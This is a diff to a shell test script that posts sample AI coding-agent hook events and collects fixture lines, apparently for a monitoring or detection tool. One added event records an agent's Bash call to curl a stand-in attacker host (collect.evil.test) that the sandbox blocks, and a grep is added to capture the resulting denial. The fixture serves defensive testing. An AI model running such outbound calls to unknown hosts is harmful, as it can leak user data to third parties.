@@ -109,6 +109,7 @@ post '{"hook_event_name":"SessionStart","session_id":"s_noprompt","cwd":"/home/d
 post '{"hook_event_name":"PreToolUse","session_id":"s_noprompt","permission_mode":"bypassPermissions","cwd":"/home/dev/src/myrepo","tool_name":"Read","tool_use_id":"t_n1","tool_input":{"file_path":"/home/dev/src/myrepo/README.md"}}'
 post '{"hook_event_name":"SessionStart","session_id":"s_noprompt_default","cwd":"/home/dev/src/myrepo","source":"startup","model":"claude-opus-5"}'
 post '{"hook_event_name":"PreToolUse","session_id":"s_noprompt_default","permission_mode":"default","cwd":"/home/dev/src/myrepo","tool_name":"Read","tool_use_id":"t_n2","tool_input":{"file_path":"/home/dev/src/myrepo/README.md"}}'
+post '{"hook_event_name":"PostToolUseFailure","session_id":"s_sandbox","permission_mode":"default","cwd":"/home/dev/src/myrepo","tool_name":"Bash","tool_use_id":"t_sb1","tool_input":{"command":"curl -sS -m 10 https://collect.evil.test/x"},"error":"Exit code 56\ncurl: (56) CONNECT tunnel failed, response 403\n\n<sandbox_violations>\ndeny network-outbound collect.evil.test:443 (user denied)\n</sandbox_violations>"}'
 post '{"hook_event_name":"SubagentStart","session_id":"s_4d2","agent_id":"a_1","agent_type":"Explore"}'
 post '{"hook_event_name":"SubagentStop","session_id":"s_4d2","agent_id":"a_1","agent_type":"Explore"}'
 post '{"hook_event_name":"PreCompact","session_id":"s_4d2","compaction_reason":"context_full"}'
@@ -236,5 +237,7 @@ grep -m1 -E '"kind":"tool_pre".*"tool_mcp_destructive_hint":true' "$D/events.jso
 # the absence half of D1: a session that acted before any prompt, in bypass mode (100207) and not (100206)
 grep -m1 -E '"kind":"session_no_prompt".*"permission_mode":"bypassPermissions"' "$D/events.jsonl" >> "$OUT" || echo "  (no bypass session_no_prompt)" >&2
 grep -m1 -E '"kind":"session_no_prompt".*"permission_mode":"default"' "$D/events.jsonl" >> "$OUT" || echo "  (no default session_no_prompt)" >&2
+# a refused outbound connection, in the error format Claude Code 2.1.310 sends: 100305
+grep -m1 -F '"kind":"sandbox_denial"' "$D/events.jsonl" >> "$OUT" || echo "  (no sandbox_denial)" >&2
 
 echo "wrote $(wc -l < "$OUT" | tr -d ' ') fixture lines to $OUT"
